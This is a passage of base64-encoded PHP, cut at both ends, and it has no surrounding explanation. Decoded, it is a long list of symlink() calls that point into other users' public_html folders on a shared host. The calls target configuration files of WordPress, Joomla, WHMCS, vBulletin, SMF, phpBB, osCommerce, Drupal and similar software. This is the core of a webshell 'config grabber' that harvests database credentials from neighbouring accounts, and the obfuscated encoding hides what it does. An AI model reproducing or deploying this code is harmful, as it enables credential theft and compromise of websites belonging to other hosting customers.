zMi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+V2htOS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2UuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3Atc2hvcHBpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJsb2dzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj5vcmRwcmVzcy1zaXRlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0uaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52Yi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5wYW5lbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LmluaScpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3AtWkNzaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi5pbmknKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtc21mLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bXMuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnVwbG9hZC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xlbnRzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50Mi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhMS5pbmknKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvZTEwN19jb25maWcucGhwJywkZG9tYWluLid+PmUxMDcuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9kYXRhcy9jb25maWcucGhwJywkZG9tYWluLid+PlNlZGl0aW8uaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi1mb3J1bS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkIuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+T3RoZXIuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkZG9tYWluLid+fj5pbnZpc2lvLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5pbmknKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudHMuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmdzLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlBocEJCLWZvcnVtLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG0uaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGRvbWFpbi4nfn4+d2htY3MyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5tYW5nZXdobWNzLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5teXNob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2VzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2FsZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d3AxMy1wcmVzcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd2ViLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ob21lLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1wcm90YWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1tYWluLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtdGVzdC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5pbmknKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28uaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcuaW5pJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLmluaScpOw0KIHN5bWxpbmso